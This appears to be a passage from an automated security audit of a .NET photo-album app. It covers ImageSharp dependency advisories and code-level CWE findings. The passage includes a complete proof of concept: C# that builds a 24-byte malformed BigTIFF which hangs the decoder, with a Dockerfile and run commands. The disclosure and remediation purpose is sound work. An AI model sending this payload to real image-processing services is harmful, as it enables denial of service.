    <ImplicitUsings>disable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="SixLabors.ImageSharp">
      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>
      <Private>true</Private>
    </Reference>
    <Reference Include="System.IO.Hashing">
      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>
      <Private>true</Private>
    </Reference>
  </ItemGroup>
</Project>

```

Dockerfile:

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0
WORKDIR /work
COPY gwg2.csproj Program.cs ./
# Restore only to obtain the published package. The repro project then uses a
# direct DLL reference so ImageSharp's package build target is not invoked.
RUN printf '%s\n' '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="SixLabors.ImageSharp" Version="4.1.1" /></ItemGroup></Project>' > fetch.csproj \
    && dotnet restore fetch.csproj --nologo \
    && rm fetch.csproj \
    && dotnet build gwg2.csproj -c Release --nologo -v quiet
ENTRYPOINT ["dotnet", "/work/bin/Release/net8.0/gwg2.dll"]

```

Run:

```sh
docker build -t imagesharp-gwg2-poc .
docker run --rm imagesharp-gwg2-poc exploit
docker run --rm imagesharp-gwg2-poc control
```

Severity: MEDIUM

Affected dependency: SixLabors.ImageSharp 3.1.11 (declared at PhotoAlbum/PhotoAlbum.csproj:16).
Vulnerable ranges and first patched versions: >= 4.0.0, < 4.1.2 (first patched: 4.1.2); >= 1.0.0-beta0001, < 3.2.0 (first patched: 3.2.0).

Recommended fix: upgrade SixLabors.ImageSharp to 3.2.0 or later.

### CVE-2026-106116: ImageSharp: BigTIFF IFD count can keep a decoder thread in a non-progressing loop
- **Severity:** optional
- **Story Points:** 1
- **Files:** PhotoAlbum/PhotoAlbum.csproj:16

[CVE-2026-106116](https://github.com/advisories/GHSA-wmxv-xphr-5c9g): ImageSharp: BigTIFF IFD count can keep a decoder thread in a non-progressing loop

### Summary

`SixLabors.ImageSharp` 4.1.1 can spend an attacker-controlled duration decoding a
small malformed BigTIFF. The BigTIFF IFD entry-count field is 64-bit. The reader
iterates once per declared entry, but when fewer than 20 bytes remain for an entry,
the entry read returns without advancing. A 24-byte input can therefore run billions
of iterations without consuming input.

One decoder invocation occupied one executing thread for more than five seconds in
the tested environment. This report makes no worker-pool exhaustion claim.

### Affected package and versions

- Package: `SixLabors.ImageSharp` (NuGet)
- Affected range: `>= 2.0.0, <= 4.1.1`
- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.

BigTIFF decoding and the unbounded `ReadValues64` loop first appear in v2.0.0. Every release tag from v2.0.0 through v4.1.1 retains that loop without constraining the entry count or terminating when a truncated entry makes no progress. The 24-byte PoC exceeded the five-second timeout on published v2.0.0 and v4.1.1; the one-entry control returned promptly on both.
### Details

[`ReadValues64`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Metadata/Profiles/Exif/ExifReader.cs#L220-L231) trusts the 64-bit IFD count and loops once per declared entry. When fewer than 20 bytes remain, [`ReadValue64`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Metadata/Profiles/Exif/ExifReader.cs#L439-L444) returns without advancing the stream or ending the outer loop.

### Tested environment

The reproduction uses the DLL in the published NuGet 4.1.1 package:

```text
SixLabors.ImageSharp.dll SHA-256:
c50231b527153cd9103acf03536a743958b3d892cc98cf9c05c9bcedef63ba0f
Runtime: .NET 8.0.30 (linux-arm64)
SDK: 8.0.424
OS: Debian GNU/Linux 12 (bookworm), Docker
```

### Reproduction

The public `Image.Load(Stream)` call receives a 24-byte little-endian BigTIFF
with its first IFD at offset 16 and entry count `5000000000`. There are no bytes
for an entry. Run the supplied container under a five-second timeout.

Complete observed output:

```text
bigTiffBytes=24 entryCount=5000000000
timeout exit status: 124
```

`timeout` exit code 124 means the decoder had not returned after five seconds.

The control is identical except the entry count is `1`:

```text
bigTiffBytes=24 entryCount=1
decoderReturned=InvalidImageContentException message=The TIFF image frame is missing the ImageWidth
Docker exit status: 0
```

The control rejects malformed input promptly; it does not time out.

No active exploitation is known.


### Complete PoC files

Program.cs:

```csharp
using SixLabors.ImageSharp;

static class Program
{
    // Little-endian BigTIFF: a header, IFD at byte 16, and no IFD entry data.
    // The count field is controlled by the input.
    private static byte[] BuildBigTiff(ulong entryCount)
    {
        byte[] bytes = new byte[24];
        bytes[0] = 0x49; bytes[1] = 0x49;               // II
        bytes[2] = 0x2B; bytes[3] = 0x00;               // BigTIFF magic
        bytes[4] = 0x08; bytes[5] = 0x00;               // 8-byte offsets
        BitConverter.GetBytes((ulong)16).CopyTo(bytes, 8);
        BitConverter.GetBytes(entryCount).CopyTo(bytes, 16);
        return bytes;
    }

    private static void Main(string[] args)
    {
        ulong entryCount = ulong.Parse(args[0]);
        byte[] bytes = BuildBigTiff(entryCount);
        Console.Error.WriteLine($"bigTiffBytes={bytes.Length} entryCount={entryCount}");
        try
        {
            using var stream = new MemoryStream(bytes);
            using Image image = Image.Load(stream);
            Console.Error.WriteLine("completed");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"decoderReturned={ex.GetType().Name} message={ex.Message}");
        }
    }
}

```

Project file:

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <!-- Directly load the DLL packaged by the published NuGet 4.1.1 release. -->
  <ItemGroup>
    <Reference Include="SixLabors.ImageSharp">
      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>
    </Reference>
    <Reference Include="System.IO.Hashing">
      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>
    </Reference>
  </ItemGroup>
</Project>

```

Dockerfile:

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0
WORKDIR /work
COPY wmxv.csproj Program.cs ./
RUN printf '%s\n' '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="SixLabors.ImageSharp" Version="4.1.1" /></ItemGroup></Project>' > fetch.csproj \
    && dotnet restore fetch.csproj --nologo \
    && rm fetch.csproj \
    && dotnet build wmxv.csproj -c Release --nologo -v quiet
ENTRYPOINT ["dotnet", "/work/bin/Release/net8.0/wmxv.dll"]

```

Run:

```sh
docker build -t imagesharp-wmxv-poc .
timeout 5 docker run --rm imagesharp-wmxv-poc 5000000000
docker run --rm imagesharp-wmxv-poc 1
```

Severity: MEDIUM

Affected dependency: SixLabors.ImageSharp 3.1.11 (declared at PhotoAlbum/PhotoAlbum.csproj:16).
Vulnerable ranges and first patched versions: >= 2.0.0, < 3.2.0 (first patched: 3.2.0); >= 4.0.0, < 4.1.2 (first patched: 4.1.2).

Recommended fix: upgrade SixLabors.ImageSharp to 3.2.0 or later.

## CWE Findings (Code-Level Vulnerabilities)

### CWE-606: Unchecked Input for Loop Condition
- **Category:** Code Quality
- **Severity:** potential
- **Story Points:** 3
- **Files:** PhotoAlbum/Pages/Index.cshtml.cs:53-65, PhotoAlbum/appsettings.json:13

IndexModel.OnPostUploadAsync iterates over every entry in the client-supplied files collection without enforcing a count limit. Although appsettings.json declares MaxFilesPerUpload as 10, the application does not read or apply that setting, so request-controlled file counts can drive repeated upload work.

### CWE-259: Use of Hard-coded Password
- **Category:** Credentials & Secrets
- **Severity:** optional
- **Story Points:** 5
- **Files:** infra/main.bicep:59

The SQL administrator password is formed in the infrastructure template from a fixed literal password prefix plus a deterministic value derived from deployment identifiers. This is an embedded password-generation pattern rather than a separately supplied secret.

### CWE-798: Use of Hard-coded Credentials
- **Category:** Credentials & Secrets
- **Severity:** optional
- **Story Points:** 5
- **Files:** infra/main.bicep:59

The SQL administrator password is formed in the infrastructure template from a fixed literal password prefix plus a deterministic value derived from deployment identifiers. This is an embedded password-generation pattern rather than a separately supplied secret.

### CWE-434: Unrestricted Upload of File with Dangerous Type
- **Category:** File & Path Security
- **Severity:** mandatory
- **Story Points:** 8
- **Files:** PhotoAlbum/Services/PhotoService.cs:82-112, PhotoAlbum/Program.cs:62-70

PhotoService.UploadPhotoAsync (PhotoAlbum/Services/PhotoService.cs:82-112) trusts the client-provided MIME type to allow an upload and derives the stored extension from the client-provided filename. Image decoding failures are caught and do not cancel the save (lines 125-137), and the upload directory is served by static-file middleware (PhotoAlbum/Program.cs:62-70). Thus non-image content can be stored under a potentially active extension in the publicly served uploads directory.
